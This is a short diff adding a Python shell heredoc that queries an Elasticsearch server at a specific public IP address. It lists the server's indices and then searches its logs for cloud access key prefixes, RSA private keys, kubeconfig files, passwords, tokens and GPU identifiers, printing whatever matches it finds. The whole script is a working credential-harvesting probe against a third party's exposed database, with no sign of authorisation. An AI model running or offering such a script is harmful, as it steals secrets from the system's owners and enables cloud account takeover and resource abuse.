@@ -1,0 +1,35 @@
+python3 - <<'PY' 2>&1
+import urllib.request, json
+BASE="http://117.148.167.132:9200"
+def req(path, data=None, t=25):
+    url=BASE+path
+    body=json.dumps(data).encode() if data is not None else None
+    r=urllib.request.Request(url, data=body, headers={"Content-Type":"application/json"})
+    try:
+        with urllib.request.urlopen(r, timeout=t) as resp:
+            return resp.status, json.loads(resp.read() or b'{}')
+    except urllib.error.HTTPError as e:
+        return e.code, e.read()[:400]
+    except Exception as e:
+        return type(e).__name__, str(e)[:120]
+st,idx=req("/_cat/indices?h=index,docs.count,store.size&s=store.size:desc")
+print("## indices",st)
+if isinstance(idx,str) or isinstance(idx,bytes): print(idx[:1000])
+else: print(idx[:1000])
+st,info=req("/_search", {"size":0,"aggs":{"idx":{"terms":{"field":"_index","size":200}}}})
+print("## agg",st)
+if isinstance(info,dict) and 'aggregations' in info:
+    print([b['key'] for b in info['aggregations']['idx']['buckets']])
+QS=["AKIA","LTAI","AKID","access_key","SecretKey","BEGIN RSA PRIVATE KEY","kubeconfig","password","token","nvidia.com/gpu","A100"]
+for q in QS:
+    st,r=req("/_search", {"size":3,"query":{"query_string":{"query":q,"lenient":True}},
+             "_source":["@timestamp","message","msg","log"],"sort":[{"@timestamp":"desc"}]})
+    print("## Q",q,st)
+    if isinstance(r,dict):
+        for h in (r.get('hits') or {}).get('hits',[]):
+            src=h.get('_source',{})
+            txt=str(src.get('message') or src.get('msg') or src.get('log') or src)[:300]
+            print("   ",h.get('_index'),txt.replace("\n"," ")[:300])
+    else: print("   ",str(r)[:250])
+print("=== DONE")
+PY
